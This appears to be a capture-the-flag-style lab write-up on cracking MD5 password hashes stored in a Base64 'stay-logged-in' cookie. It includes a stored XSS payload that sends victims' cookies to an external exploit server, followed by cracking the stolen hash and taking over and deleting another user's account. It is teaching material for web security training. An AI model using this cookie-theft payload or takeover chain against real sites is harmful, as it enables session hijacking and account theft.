# Offline Password Cracking

## 📌 Lab Overview

This lab demonstrates an **Offline Password Cracking** vulnerability.

The application implemented a **"Stay Logged In"** feature using cookies. However, the cookie contained sensitive authentication information that could be decoded and cracked offline.

Additionally, the application was vulnerable to **Stored Cross-Site Scripting (Stored XSS)**, allowing an attacker to steal another user's authentication cookie and recover their password without directly attacking the login page.

The vulnerability existed because:

- authentication data was stored inside a client-side cookie
- the cookie used a weak MD5 password hash
- the hash could be cracked offline
- stored XSS allowed cookie theft
- sensitive authentication information was exposed to users

This lab focused on:

- authentication weaknesses
- cookie analysis
- Base64 decoding
- MD5 hash cracking
- Stored XSS
- session hijacking
- offline password recovery

---

# 🔍 What is Offline Password Cracking?

Offline password cracking occurs when an attacker obtains a password hash and attempts to recover the original password without interacting with the target application.

Unlike online brute forcing:

```text
Attacker → Login Page → Guess Password
```

offline cracking happens locally:

```text
Hash Obtained
↓
Dictionary Attack
↓
Password Recovered
```

Since the application is never contacted during the attack:

- no rate limiting exists
- no account lockouts occur
- cracking can be extremely fast

---

# ⚠ Why Was the Application Vulnerable?

The application stored authentication information inside a cookie:

```text
stay-logged-in=
Base64(username:md5(password))
```

Example:

```text
Base64(
    wiener:md5(peter)
)
```

After decoding:

```text
wiener:51dc30ddc474d43a6011e9ebba6ca
```

If the hash is weak and publicly crackable:

```text
MD5 Hash
↓
Dictionary Lookup
↓
Original Password
```

the attacker can recover the user's password.

---

# 🎯 Objective

The goal of this lab was to:

- analyze the Stay Logged In cookie
- verify how authentication data was stored
- exploit Stored XSS
- steal Carlos's cookie
- crack the password hash offline
- authenticate as Carlos
- delete Carlos's account

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/authentication/Offline%20Password%20Cracking/screenshots/lab10(1).png?raw=true)

The application initially displayed:

- a normal webpage
- a **My Account** button

---

## Screenshot 2 — Login as Wiener

![Screenshot 2](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/authentication/Offline%20Password%20Cracking/screenshots/lab10(2).png?raw=true)

After clicking **My Account**, I landed on the login page.

The lab provided valid credentials:

```text
Username: wiener
Password: peter
```

I also enabled:

```text
☑ Stay Logged In
```

and clicked **Log In**.

---

## Screenshot 3 — Successful Login

![Screenshot 3](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/authentication/Offline%20Password%20Cracking/screenshots/lab10(3).png?raw=true)

The login succeeded and I was authenticated as:

```text
wiener
```

The account page exposed:

- Update Email
- Delete Account

---

## Screenshot 4 — Analyzing the Stay Logged In Cookie

![Screenshot 4](screenshot-auth4.png)

I captured the authenticated request:

```http
GET /my-account?id=wiener
```

The request contained:

```http
Cookie:
session=QMHed5XoOXAaaFMN8zvzob9oOa0Rgfk
stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3NGQ0M2E2MDExZTI1YmJhNmNhNzcw
```

When the cookie value was highlighted inside Burp Suite, the Inspector automatically decoded it from Base64.

Decoded value:

```text
wiener:51dc30ddc474d43a6011e9ebba6ca
```

The structure clearly appeared to be:

```text
username : md5(password)
```

---

## Screenshot 5 — Cracking the MD5 Hash

![Screenshot 5](screenshot-auth5.png)

I copied the hash:

```text
51dc30ddc474d43a6011e9ebba6ca
```

and submitted it to CrackStation.

Recovered password:

```text
peter
```

This confirmed the application's cookie generation logic.

### Cookie Logic Breakdown

The application appeared to generate the cookie as:

```text
1. Take username
2. Hash password using MD5
3. Join them together

username:md5(password)

4. Encode the result using Base64
```

Example:

```text
wiener:peter
↓
wiener:md5(peter)
↓
wiener:51dc30ddc474d43a6011e9ebba6ca
↓
Base64(...)
↓
stay-logged-in cookie
```

If another user's cookie could be obtained:

```text
carlos:md5(password)
```

the password hash could potentially be cracked offline.

---

## Screenshot 6 — Testing for Stored XSS

![Screenshot 6](screenshot-auth6.png)

To obtain another user's cookie, I explored the blog section and found a comment feature.

I submitted:

```html
<script>alert(1)</script>
```

along with normal comment details.

The goal was to verify whether Stored XSS existed.

---

## Screenshot 7 — Comment Submission

![Screenshot 7](screenshot-auth7.png)

The application responded:

```text
Thank you for your comment!
Your comment has been submitted.
```

and displayed a:

```text
Back to Blog
```

button.

---

## Screenshot 8 — Stored XSS Confirmed

![Screenshot 8](screenshot-auth8.png)

After returning to the blog page, the browser displayed:

```javascript
alert(1)
```

This confirmed that Stored XSS was present.

---

## Screenshot 9 — Stealing Victim Cookies

![Screenshot 9](screenshot-auth9.png)

After confirming Stored XSS, I submitted the following payload:

```html
<script>
document.location='//exploit-0aae009b0432bc28801b0237018500ea.exploit-server.net/'+document.cookie
</script>
```

### Payload Breakdown

```javascript
document.cookie
```

retrieves all accessible cookies from the victim browser.

```javascript
document.location=
```

forces the victim browser to navigate to an attacker-controlled server.

The final request becomes:

```text
https://attacker-server/
secret=...
stay-logged-in=...
```

sending the victim's cookies directly to the attacker.

---

## Screenshot 10 — Capturing Carlos's Cookie

![Screenshot 10](screenshot-auth10.png)

I opened the exploit server logs and captured a request from the victim.

Captured data:

```text
secret=Ato0skcP4kbvRmacfRQZfkcHvnjorn9W
stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

This provided Carlos's authentication cookie.

---

## Screenshot 11 — Decoding Carlos's Cookie

![Screenshot 11](screenshot-auth11.png)

Using Burp Decoder, I decoded:

```text
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

Result:

```text
carlos:26323c16d5f4dabff3bb136f2460a943
```

Again, the structure was:

```text
username : md5(password)
```

The MD5 hash now belonged to Carlos.

---

## Screenshot 12 — Cracking Carlos's Password

![Screenshot 12](screenshot-auth12.png)

I submitted the hash:

```text
26323c16d5f4dabff3bb136f2460a943
```

to CrackStation.

Recovered password:

```text
onceuponatime
```

The password was successfully cracked offline.

---

## Screenshot 13 — Logging in as Carlos

![Screenshot 13](screenshot-auth13.png)

I returned to the login page and used:

```text
Username: carlos
Password: onceuponatime
```

---

## Screenshot 14 — Successful Authentication

![Screenshot 14](screenshot-auth14.png)

The login succeeded.

I was authenticated as:

```text
carlos
```

The account page exposed:

- Update Email
- Delete Account

---

## Screenshot 15 — Deleting Carlos's Account

![Screenshot 15](screenshot-auth15.png)

I clicked:

```text
Delete Account
```

entered Carlos's password and confirmed the action.

The application displayed the success message and the lab was solved.

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because:

```text
Sensitive Authentication Data
```

was stored directly inside a client-side cookie.

Additionally:

```text
MD5
```

is a fast and outdated hashing algorithm that is highly susceptible to dictionary attacks.

Combined with Stored XSS:

```text
Stored XSS
↓
Cookie Theft
↓
Hash Extraction
↓
Offline Cracking
↓
Account Takeover
```

the entire authentication mechanism became vulnerable.

---

# 💥 Impact

An attacker could potentially:

- steal authentication cookies
- recover user passwords
- hijack user accounts
- bypass authentication controls
- impersonate victims
- delete or modify user data
- escalate attacks through Stored XSS

---

# 🛡 Mitigation

To prevent this issue:

- never store password hashes in client-side cookies
- use secure server-side session management
- implement HttpOnly cookies
- implement Secure cookies
- implement SameSite cookies
- prevent XSS vulnerabilities
- use strong password hashing algorithms such as:
  - bcrypt
  - Argon2
  - PBKDF2
- rotate authentication tokens regularly

---

# 🧠 Skills Learned

- Authentication Testing
- Cookie Analysis
- Base64 Decoding
- MD5 Hash Identification
- Offline Password Cracking
- Stored XSS Exploitation
- Cookie Theft
- Session Analysis
- Account Takeover Techniques

---

# 🧰 Tools Used

- Burp Suite
- Burp Decoder
- Burp Repeater
- CrackStation
- Browser Developer Tools
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how insecure authentication designs can expose user credentials even without attacking the login page directly.

By analyzing the Stay Logged In cookie, identifying that it stored:

```text
Base64(username:md5(password))
```

and exploiting Stored XSS to steal another user's cookie, I was able to recover Carlos's password through offline hash cracking.

Through this lab, I learned:

- how authentication cookies are commonly abused
- why client-side storage of password hashes is dangerous
- how Stored XSS can lead to account compromise
- how offline password cracking works
- why MD5 should never be used for authentication-related storage

The lab was successfully solved by combining Stored XSS, cookie theft, Base64 decoding, and offline password cracking to gain access to Carlos's account and delete it.
